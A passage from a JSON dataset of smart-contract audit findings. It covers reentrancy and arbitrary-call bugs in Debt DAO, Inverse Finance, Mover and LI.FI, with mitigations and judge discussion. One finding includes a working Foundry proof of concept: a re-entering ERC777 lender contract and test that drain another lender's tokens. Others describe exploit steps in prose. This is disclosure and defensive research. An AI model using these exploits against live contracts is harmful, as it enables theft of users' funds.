unsupportedToken.approve(address(escrow), MAX_INT);\n        unsupportedToken.approve(address(line), MAX_INT);\n        vm.stopPrank();\n\n        vm.startPrank(lender);\n        supportedToken1.approve(address(escrow), MAX_INT);\n        supportedToken1.approve(address(line), MAX_INT);\n        supportedToken2.approve(address(escrow), MAX_INT);\n        supportedToken2.approve(address(line), MAX_INT);\n        unsupportedToken.approve(address(escrow), MAX_INT);\n        unsupportedToken.approve(address(line), MAX_INT);\n        vm.stopPrank();\n\n    }\n\n    function _addCredit(address token, uint256 amount) public {\n        hoax(borrower);\n        line.addCredit(dRate, fRate, amount, token, lender);\n        vm.stopPrank();\n        hoax(lender);\n        line.addCredit(dRate, fRate, amount, token, lender);\n        vm.stopPrank();\n    }\n\n    receive() external payable {}\n}\n\n```\n\nRelated links:\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L488\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L173\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nAdd reentrancy protection on 'close()' function.",
      "summary": "\nThis bug report is about a vulnerability found in the LineOfCredit.sol contract, which is part of the Line-of-Credit project. The vulnerability allows the lender to exploit it to draw out extra tokens from borrower's account when the credit token is ERC20 extensive with hook, such as ERC777 token. As a result, the 'count' state variable would also be underflowed, causing the line contract to be unable to be 'REPAID', and the borrower would never be able to get back the collateral. This is similar to an attack on imBTC.\n\nA proof of concept code was provided in the report, which shows how to exploit the vulnerability. The vulnerable point is in the '_close()' function, where there is no reentrancy protection.\n\nThe recommended mitigation step is to add reentrancy protection on the 'close()' function. The tools used to find the vulnerability is VS Code.",
      "report_date": {},
      "contest_prize_txt": "$115,500 USDC",
      "contest_link": "https://code4rena.com/contests/2022-11-debt-dao-contest",
      "sponsor_name": "Debt DAO",
      "sponsor_link": "https://twitter.com/debtdao",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/176",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "174",
      "slug": "m-06-the-lender-can-draw-out-extra-credit-token-from-borrowers-account-code4rena-debt-dao-debt-dao-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Debt DAO",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Debt DAO",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Liquidity manager"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Payments"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "RWA Lending"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "6245",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 4,
      "protocol_id": "119",
      "title": "[M-05] Reentrancy bug allows lender to steal other lenders funds",
      "content": "\nA reentrancy bug in `LineOfCredit.sol` allows the lender to steal other lenders tokens if they are lending the same tokens type (loss of funds).\n\nThe  reentrancy occurs in the `_close(credit, id)` function in `LineOfCredit.sol`. The `credit[id]` state variable is cleared only after sendings tokens to the lender.\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L483>\n\n        function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n            if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }\n\n            // return the Lender's funds that are being repaid\n            if (credit.deposit + credit.interestRepaid > 0) {\n                LineLib.sendOutTokenOrETH(\n                    credit.token,\n                    credit.lender,\n                    credit.deposit + credit.interestRepaid\n                );\n            }\n\n            delete credits[id]; // gas refunds\n\n            // remove from active list\n            ids.removePosition(id);\n            unchecked { --count; }\n\n            // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.\n            if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }\n\n            emit CloseCreditPosition(id);\n\n            return true;\n        }\n\n### Proof of Concept\n\nReentrancy is possible if the borrower is lending tokens that can change the control flow. Such tokens are based on ERC20 such as ERC777, ERC223 or other customized ERC20 tokens that alert the receiver of transactions.\nExample of a real-world popular token that can change control flow is PNT (pNetwork).\n\nAs the protocol supports any token listed on the oracle, if the oracle currently supports (or will support in the future) a feed of the above tokens, the bug is exploitable.\n\nIf a reentrancy occurs in the `_close(credit, id)` function, the `credit[id]` state variable is cleared only after sendings tokens to the lender.\nA lender can abuse this by reentrancy to `close(id)` and retrieve `credit.deposit + credit.interestRepaid` amount of `credit.token`. A lender can repeat these processes as long as LineOfCredit has funds available.\n\nThe POC will demonstrate the following flow:\n\n1.  Borrower  adds a new credit with lender1 on 1000 tokens.\n2.  Borrower lends 1000 from lender1\n3.  Borrower repays debt\n4.  Borrower adds a new credit with lender2 on 1000 tokens\n5.  Borrower closes debt with lender1\n6.  Lender1 receives 2000 tokens.\n\nAdd the `MockLender.sol` to mock folder.\n\n    pragma solidity 0.8.9;\n\n    import { ILineOfCredit } from \"../interfaces/ILineOfCredit.sol\";\n    import { Token777 } from \"./Token777.sol\";\n\n    contract MockLender {\n        address owner;\n        ILineOfCredit line;\n        bytes32 id;\n        bool lock;\n        \n        event GotMoney(uint256 amount);\n\n        constructor(address _line) public {\n            line = ILineOfCredit(_line);\n            owner = msg.sender;\n        }\n\n        function addCredit(\n            uint128 drate,\n            uint128 frate,\n            uint256 amount,\n            address token\n        ) external {\n            require(msg.sender == owner, \"Only callable by owner\");\n            Token777(token).approve(address(line), amount);\n            Token777(token).approve(address(owner), type(uint256).max);\n            Token777(token).mockAddToRegistry();\n            id = line.addCredit(drate, frate, amount, token, address(this));\n        }\n        function tokensReceived(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes calldata userData,\n            bytes calldata operatorData\n        ) external {\n            emit GotMoney(amount);\n            if(!lock){\n                lock = true;\n                line.close(id);\n            }\n        }\n\n        receive() external payable {\n        }\n\n    }\n\nAdd `Token777.sol` to mocks folder:\n\n    pragma solidity 0.8.9;\n\n    import \"openzeppelin/token/ERC20/ERC20.sol\";\n    interface IERC777Recipient {\n        function tokensReceived(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes calldata userData,\n            bytes calldata operatorData\n        ) external;\n    }\n\n    contract Token777 is ERC20(\"Token used to trade\", \"777\") {\n        mapping(address => uint256) private _balances;\n        mapping(address => address) private registry;\n        uint256 private _totalSupply;\n\n        string private _name;\n        string private _symbol;\n\n        // ERC20-allowances\n        mapping(address => mapping(address => uint256)) private _allowances;\n\n        event Test(address);\n\n        constructor() {\n        }\n\n        function mint(address account, uint256 amount) external returns(bool) {\n            _mint(account, amount);\n            return true;\n        }\n\n        function _mint(\n            address account,\n            uint256 amount\n        ) internal virtual override{\n            require(account != address(0), \"ERC777: mint to the zero address\");\n\n            // Update state variables\n            _totalSupply += amount;\n            _balances[account] += amount;\n            emit Test(account);\n        }\n        function balanceOf(address account) public view virtual override returns (uint256) {\n            return _balances[account];\n        }\n\n        function approve(address spender, uint256 value) public virtual override returns (bool) {\n            address holder = _msgSender();\n            _approve(holder, spender, value);\n            return true;\n        }\n       function _approve(\n            address holder,\n            address spender,\n            uint256 value\n        ) internal  virtual override {\n            require(holder != address(0), \"ERC777: approve from the zero address\");\n            require(spender != address(0), \"ERC777: approve to the zero address\");\n\n            _allowances[holder][spender] = value;\n            emit Approval(holder, spender, value);\n        }\n        function transferFrom(\n            address holder,\n            address recipient,\n            uint256 amount\n        ) public virtual override returns (bool) {\n            address spender = _msgSender();\n            emit Test(msg.sender);\n            _spendAllowance(holder, spender, amount);\n            _send(holder, recipient, amount, \"\", \"\", false);\n            return true;\n        }\n\n        function allowance(address holder, address spender) public view virtual override returns (uint256) {\n            return _allowances[holder][spender];\n        }\n        function _spendAllowance(\n            address owner,\n            address spender,\n            uint256 amount\n        ) internal override virtual {\n            emit Test(msg.sender);\n            uint256 currentAllowance = allowance(owner, spender);\n            if (currentAllowance != type(uint256).max) {\n                require(currentAllowance >= amount, \"ERC777: insufficient allowance\");\n                unchecked {\n                    _approve(owner, spender, currentAllowance - amount);\n                }\n            }\n        }\n\n        function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n            _send(_msgSender(), recipient, amount, \"\", \"\", false);\n            return true;\n        }\n\n        function _send(\n            address from,\n            address to,\n            uint256 amount,\n            bytes memory userData,\n            bytes memory operatorData,\n            bool requireReceptionAck\n        ) internal virtual {\n            require(from != address(0), \"ERC777: transfer from the zero address\");\n            require(to != address(0), \"ERC777: transfer to the zero address\");\n\n            address operator = _msgSender();\n\n            _move(operator, from, to, amount, userData, operatorData);\n\n            _callTokensReceived(operator, from, to, amount, userData, operatorData, requireReceptionAck);\n        }\n\n\n        function _move(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes memory userData,\n            bytes memory operatorData\n        ) private {\n            uint256 fromBalance = _balances[from];\n            require(fromBalance >= amount, \"ERC777: transfer amount exceeds balance\");\n            unchecked {\n                _balances[from] = fromBalance - amount;\n            }\n            _balances[to] += amount;\n        }\n\n        function _callTokensReceived(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes memory userData,\n            bytes memory operatorData,\n            bool requireReceptionAck\n        ) private {\n            address implementer = registry[to];\n            if (implementer != address(0)) {\n                IERC777Recipient(implementer).tokensReceived(operator, from, to, amount, userData, operatorData);\n            }\n        }\n\n        function mockAddToRegistry() external {\n            registry[msg.sender] = msg.sender;\n        }\n\n    }\n\nAdd the following imports to `LineOfCredit.t.sol`:\n\n    import { MockLender } from \"../mock/MockLender.sol\";\n    import { Token777 } from \"../mock/Token777.sol\";\n\nAdd the following test to `LineOfCredit.t.sol`:\n\n```\n\n    function test_reentrancy() public {\n        uint256 lenderOneAmount = 1000;\n        uint256 lenderTwoAmount = 1000;\n        Token777 tokenUsed = new Token777();\n        // Create lenderController \n        address lenderOneController = address(0xdeadbeef);\n        address lender2 = address(0x1337);\n\n        // Create lenderContract \n        vm.startPrank(lenderOneController);\n        MockLender lenderOneContract = new MockLender(address(line));\n        vm.stopPrank();\n\n        // give lenders their lend amount of token\n        tokenUsed.mint(address(lenderOneContract), lenderOneAmount);\n        tokenUsed.mint(address(lender2), lenderTwoAmount);\n\n        // add support of the token to the SimpleOracle\n        oracle.changePrice(address(tokenUsed), 1000 * 1e8); // 1000 USD\n\n        // Borrowers adds credit line from lender2\n        vm.startPrank(borrower);\n        line.addCredit(dRate, fRate, lenderOneAmount, address(tokenUsed), address(lenderOneContract));\n        vm.stopPrank();\n\n        // LenderOne adds credit line\n        vm.startPrank(lenderOneController);\n        lenderOneContract.addCredit(dRate, fRate, lenderOneAmount, address(tokenUsed));\n        vm.stopPrank();\n\n        //borrow 1 ether\n        bytes32 id_first = line.ids(0);\n        vm.startPrank(borrower);\n        line.borrow(id_first, lenderOneAmount);\n        vm.stopPrank();\n        \n        // Borrowers adds an additional credit line from lender2\n        vm.startPrank(borrower);\n        line.addCredit(dRate, fRate, lenderTwoAmount, address(tokenUsed), address(lender2));\n        vm.stopPrank();\n\n        // Lender2 adds an additional credit line from  \n        vm.startPrank(lender2);\n        tokenUsed.approve(address(line), lenderTwoAmount);\n        line.addCredit(dRate, fRate, lenderTwoAmount, address(tokenUsed),  address(lender2));\n        vm.stopPrank();\n\n        // repay all debt to lender 1\n        vm.startPrank(borrower);\n        tokenUsed.approve(address(line), lenderOneAmount);\n        line.depositAndRepay(lenderOneAmount);\n        line.close(id_first);\n        vm.stopPrank();\n        \n        //validate that lender1 was able to steal lender2 tokens\n        assert(tokenUsed.balanceOf(address(lenderOneContract)) == lenderOneAmount + lenderTwoAmount);\n    }\n```\n\nTo run the POC execute:\n`forge test -v`\n\nExpected output:\n\n    [PASS] test_reentrancy() (gas: 1636410)\n    Test result: ok. 1 passed; 0 failed; finished in 1.71ms\n\nTo get full trace execute:\n`forge test -vvvv`\n\n### Tools Used\n\nVS Code, Foundry.\n\n### Recommended Mitigation Steps\n\nSend tokens only at the end of `_close(Credit memory credit, bytes32 id)` or add a reentrancyGuard.\n\n**[kibagateaux (Debt DAO) disputed and commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/160#issuecomment-1332394657):**\n > Similar comments to [#176](https://github.com/code-423n4/2022-11-debtdao-findings/issues/176). Both Lenders would have to agree to use tokens that have inherent reentrancy attacks built into the token. This issue feels much more valid than the other one.\n> \n> In my opinion its not valid to say \"if you add malicious things, malicious things happen\". If I didn't want token reentrancy attacks, I simply wouldn't add tokens with explicit arbitrary reentrancy abilities.\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/160#issuecomment-1340012972):**\n> That line of reasoning doesn't hold up. The user should be protected against accidentally allowing a token that has a reentrancy attack vector. There is not an immediate and obvious difference between ERC777 and ERC20 tokens. This issue has been a viable Medium risk going all the way back to Uniswap V2 (or possibly before).\n\n\n***\n\n",
      "summary": "\nA bug has been reported in the LineOfCredit.sol contract, which is part of the Line-of-Credit project on Github. This bug allows the lender to steal other lenders tokens if they are lending the same tokens type (loss of funds). This is due to a reentrancy bug in the `_close(credit, id)` function. The `credit[id]` state variable is cleared only after sending tokens to the lender, meaning a lender can abuse this by reentrancy to `close(id)` and retrieve `credit.deposit + credit.interestRepaid` amount of `credit.token`.\n\nTo demonstrate this bug, a Proof of Concept (POC) was created using the MockLender.sol and Token777.sol contracts. This POC shows that if a borrower adds a new credit with lender1 on 1000 tokens, then lends 1000 from lender1, repays debt, adds a new credit with lender2 on 1000 tokens, and closes debt with lender1, lender1 will receive 2000 tokens.\n\nThe tools used to create the POC were VS Code and Foundry. The recommended mitigation steps are to either send tokens only at the end of `_close(Credit memory credit, bytes32 id)` or to add a reentrancyGuard.",
      "report_date": {},
      "contest_prize_txt": "$115,500 USDC",
      "contest_link": "https://code4rena.com/contests/2022-11-debt-dao-contest",
      "sponsor_name": "Debt DAO",
      "sponsor_link": "https://twitter.com/debtdao",
      "quality_score": 5,
      "general_score": 3.3333333333333335,
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/160",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "174",
      "slug": "m-05-reentrancy-bug-allows-lender-to-steal-other-lenders-funds-code4rena-debt-dao-debt-dao-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Debt DAO",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Debt DAO",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Liquidity manager"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Payments"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "RWA Lending"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "5733",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "126",
      "title": "[M-04] ERC777 reentrancy when withdrawing can be used to withdraw all collateral",
      "content": "\n[Market.sol#L464](https://github.com/code-423n4/2022-10-inverse/blob/cc281e5800d5860c816138980f08b84225e430fe/src/Market.sol#L464)<br>\n\nMarkets can be deployed with arbitrary tokens for the collateral, including ERC777 tokens (that are downwards-compatible with ERC20). However, when the system is used with those tokens, an attacker can drain his escrow contract completely while still having a loan. This happens because with ERC777 tokens, there is a `tokensToSend` hook that is executed before the actual transfer (and the balance updates) happen. Therefore, `escrow.balance()` (which retrieves the token balance) will still report the old balance when an attacker reenters from this hook.\n\n### Proof Of Concept\n\nWe assume that `collateral` is an ERC777 token and that the `collateralFactorBps` is 5,000 (`50%`). The user has deposited 10,000 USD (worth of collateral) and taken out a loan worth 2,500 USD. He is therefore allowed to withdraw 5,000 USD (worth of collateral). However, he can usse the ERC777 reentrancy to take out all 10,000 USD (worth of collateral) and still keep the loaned 2,500 USD:\n1. The user calls `withdraw(amount)` to withdraw his 5,000 USD (worth of collateral).\n2. In `withdrawInternal`, the limit check succeeds (the user is allowed to withdraw 5,000 USD) and `escrow.pay(to, amount)` is called. This will initiate a transfer to the provided address (no matter which escrow is used, but we assume `SimpleERC20Escrow` for this example).\n3. Because the collateral is an ERC777 token, the `tokensToSend` hook is executed before the actual transfer (and before any balance updates are made). The user can exploit this by calling `withdraw(amount)` again within the hook.\n4. `withdrawInternal` will call `getWithdrawalLimitInternal`, which calls `escrow.balance()`. This receives the collateral balance of the escrow, which is not yet updated. Because of that, the balance is still 10,000 USD (worth of collateral) and the calculated withdraw limit is therefore still 5,000 USD.\n5. Both transfers (the reentered one and the original one) succeed and the user has received all of his collateral (10,000 USD), while still having the 2,500 USD loan.\n\n### Recommended Mitigation Steps\n\nMark these functions as `nonReentrant`.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-10-inverse-findings/issues/206#issuecomment-1304567191):**\n > Sponsor should review as the attack does seem valid with some pre-conditions (ERC777 tokens being used for collateral). Probably more of a Medium severity.\n\n**[08xmt (Inverse) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-10-inverse-findings/issues/206#issuecomment-1313354099):**\n > We make the security assumption that future collateral added by Inverse Finance DAO is compliant with standard ERC-20 behavior. Inverse Finance is full control of collateral that will be added to the platform and only intend to add collateral that properly reverts on failed transfers. Each ERC20 token added as collateral will be audited for non-standard behaviour. I would consider this a Low Risk finding, depending on how you value errors made in launch parameters.\n\n**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-10-inverse-findings/issues/206#issuecomment-1329464062):**\n > @08xmt - The revert on a failed transfer here isn't the issue, it is the re-entrancy that isn't guarded against properly. While I understand your comment, if it were my codebase, I would simply add the modifier and incur the small gas costs as an additional layer of security to avoid mistakes in the future. I don't think this qualifies as High, but does show an attack path that *could* be achieved with an ERC777 token being used as collateral. Going to downgrade to Medium and will be happy to hear more discussion on the topic before final review. \n\n**[08xmt (Inverse) commented](https://github.com/code-423n4/2022-10-inverse-findings/issues/206#issuecomment-1332543501):**\n > @0xean - The risk is still only present with unvetted contracts, and if the desire should exist in the future to implement a market with a token with re-entrancy, the code can be modified as necessary.\n> \n> Will respect the judge's decision on severity in the end, but ultimately seem like a deployment parameter risk more than anything.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-10-inverse-findings/issues/206#issuecomment-1333969128):**\n > Thanks @08xmt for the response.\n> \n> While I agree that proper vetting *could* avoid this issue, the wardens are analyzing the code and documentation that is presented before them and I think in light of this, the issue is valid. Had the warden simply stated that there was a reentrancy modifier missing without showing a valid path to it being exploited, I would downgrade to QA. But given they showed a valid attack path due to the lack of reentrancy controls I think this should be awarded.\n\n\n\n***\n\n",
      "summary": "\nA bug was discovered in the code of a decentralized loan system. This bug allows an attacker to take out more collateral than allowed and still keep the loaned amount. The bug is present when the system is used with an ERC777 token, as there is a `tokensToSend` hook that is executed before the actual transfer (and the balance updates) happen. This means that the balance is still reported as the old balance when an attacker reenters from this hook. To exploit this, the attacker can call `withdraw(amount)` twice, once in the hook and once normally. This will allow them to withdraw more collateral than allowed and still keep the loaned amount. The recommended mitigation step is to mark these functions as `nonReentrant`.",
      "report_date": {},
      "contest_prize_txt": "$50,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-10-inverse-finance-contest",
      "sponsor_name": "Inverse Finance",
      "sponsor_link": "https://twitter.com/InverseFinance",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2022-10-inverse",
      "github_link": "https://github.com/code-423n4/2022-10-inverse-findings/issues/206",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "175",
      "slug": "m-04-erc777-reentrancy-when-withdrawing-can-be-used-to-withdraw-all-collateral-code4rena-inverse-finance-inverse-finance-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Inverse Finance",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Inverse Finance",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Synthetics"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "3383",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "127",
      "title": "M-1: `exchangeFee` can be escaped",
      "content": "Source: https://github.com/sherlock-audit/2022-10-mover-judging/issues/120 \n\n## Found by \nWATCHPUG\n\n## Summary\n\nComparing the before and after balance of the swap call for the swapped amount can be exploited to escape the `exchangeFee` by wrapping the actual swap inside a fake swap.\n\n## Vulnerability Detail\n\nThe attacker can reenter with another `CardTopupPermit() -> _processTopup() -> IExchangeProxy#executeSwapDirect()` at L174 to claw back the fee:\n\n1. Swap minAmount with 1inch, inside the 1inch swap at `ExchangeProxy.sol#L174`, reenter and `HardenedTopupProxy.sol#CardTopupPermit()`;\n2. The inner swap is the actual amount: `$1M`, which should pay for `$1000` `exchangeFee`;\n3. After the inner swap, `amountReceived` includes the `$1000` `exchangeFee`, which will be sent back to the user.\n\nAs a result, the user successfully escaped most of the `exchangeFee`.\n\n## Impact\n\nUser can escape the `exchangeFee`.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-mover/blob/main/cardtopup_contract/contracts/HardenedTopupProxy.sol#L336-L343\n\nhttps://github.com/sherlock-audit/2022-10-mover/blob/main/cardtopup_contract/contracts/ExchangeProxy.sol#L160-L185\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider adding `nonReentrant()` modifier to all the 3 non-view methods in the `HardenedTopupProxy`:\n\n- CardTopupPermit();\n- CardTopupTrusted();\n- CardTopupMPTProof().\n\n## Discussion\n\n**McMannaman**\n\nThis is a valid point. Would be fixed by adding nonReentrant modifiers.\n\n**jack-the-pug**\n\nFix confirmed\n\n**McMannaman**\n\nThe fixes are in https://github.com/viaMover/2022-10-mover/pull/2",
      "summary": "\nThis bug report concerns a vulnerability found in the exchangeFee feature of the Mover platform. It was discovered by WATCHPUG and the issue is that it can be escaped. The attacker can reenter with another CardTopupPermit() -> _processTopup() -> IExchangeProxy#executeSwapDirect() at L174 to claw back the fee. This is done by swapping the minAmount with 1inch, then the inner swap is the actual amount, with the exchangeFee including the $1000. As a result, the user successfully escapes most of the exchangeFee. \n\nThe impact of this vulnerability is that users can escape the exchangeFee. The code snippet for this issue can be found at HardenedTopupProxy.sol#L336-L343 and ExchangeProxy.sol#L160-L185. The tool used to find this vulnerability was Manual Review. The recommendation to fix this vulnerability is to consider adding nonReentrant() modifiers to all 3 non-view methods in the HardenedTopupProxy. This suggestion was confirmed by jack-the-pug, and the fixes can be found at github.com/viaMover/2022-10-mover/pull/2.",
      "report_date": {},
      "contest_prize_txt": "25000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/10",
      "sponsor_name": "Mover",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-mover-judging/issues/120",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "10",
      "slug": "m-1-exchangefee-can-be-escaped-sherlock-mover-mover-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Mover",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Mover",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "RWA"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "Calldata"
          }
        }
      ]
    },
    {
      "id": "7040",
      "kind": "PDF",
      "auditfirm_id": "6",
      "impact": "HIGH",
      "finders_count": 3,
      "protocol_id": "2",
      "title": "Too generic calls in GenericBridgeFacet allow stealing of tokens",
      "content": "## Security Report\n\n## Severity\n**High Risk**\n\n## Context\n- `GenericBridgeFacet.sol#L69-L120`\n- `LibSwap.sol#L30-L68`\n\n## Description\nWith the contract `GenericBridgeFacet`, the functions `swapAndStartBridgeTokensGeneric()` (via `LibSwap.swap()`) and `_startBridge()` allow arbitrary function calls, which enable anyone to call `transferFrom()` and steal tokens from users who have provided a large allowance to the LiFi protocol. This vulnerability has been exploited in the past.\n\n### Additional Risks\n- Ability to call the LiFi Diamond itself via functions that don’t have `nonReentrant`.\n- Potential cancellation of transfers for other users.\n- Calling functions protected by checks on `this`, such as `completeBridgeTokensViaStargate`.\n\n```solidity\ncontract GenericBridgeFacet is ILiFi, ReentrancyGuard {\n    function swapAndStartBridgeTokensGeneric(\n        ...\n        LibSwap.swap(_lifiData.transactionId, _swapData[i]);\n        ...\n    )\n    \n    function _startBridge(BridgeData memory _bridgeData) internal {\n        ...\n        (bool success, bytes memory res) = _bridgeData.callTo.call{ value: value }(_bridgeData.callData);\n        ...\n    }\n}\n\nlibrary LibSwap {\n    function swap(bytes32 transactionId, SwapData calldata _swapData) internal {\n        ...\n        (bool success, bytes memory res) = _swapData.callTo.call{ value: nativeValue }(_swapData.callData);\n        ...\n    }\n}\n```\n\n## Recommendation\nWhitelist the external call addresses and function signatures for both the decentralized exchanges and the bridges. Note: `SwapperV2` already includes whitelist functionality for exchanges, but it isn’t utilized within this contract.\n\nAlternatively, ensure this code is no longer integrated into the LiFi Diamond. This can be accomplished by removing the code from the repository or adding a warning within the code itself.\n\n### LiFi Status\nThe feature has been removed from all contract deployments since the exploit. We do not intend to re-enable it, so it can be removed from the repository. See PR #4 for details.\n\n### Spearbit Status\nThe issue is resolved by deleting the `GenericBridgeFacet` contract.",
      "summary": "\nThis bug report is about a vulnerability in the GenericBridgeFacet and LibSwap contracts. It has been found that with these contracts, anyone can call the transferFrom() function, allowing them to steal tokens from users who have given a large allowance to the LiFi protocol. Additionally, this vulnerability also allows someone to call the Lifi Diamond itself, cancel transfers of other users, call functions that are protected by a check on this, and more. \n\nThe recommendation is to whitelist the external call addresses and function signatures for both the dexes and the bridges. Alternatively, the code can be removed from the repository and/or a warning can be added inside the code itself. LiFi has removed the code from all contract deployments since the exploit and do not plan to enable it again, so they plan to remove it from the repository. Spearbit has solved the issue by deleting the GenericBridgeFacet contract.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
      "github_link": "",
      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/LIFI-Spearbit-Security-Review.pdf",
      "pdf_page_from": 11,
      "contest_id": "",
      "slug": "too-generic-calls-in-genericbridgefacet-allow-stealing-of-tokens-spearbit-lifi-pdf",
      "firm_name": "Spearbit",
      "firm_logo_square": "spearbit_square.png",
      "protocol_name": "LI.FI",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
      },
      "protocols_protocol": {
        "name": "LI.FI",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Liquidity manager"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
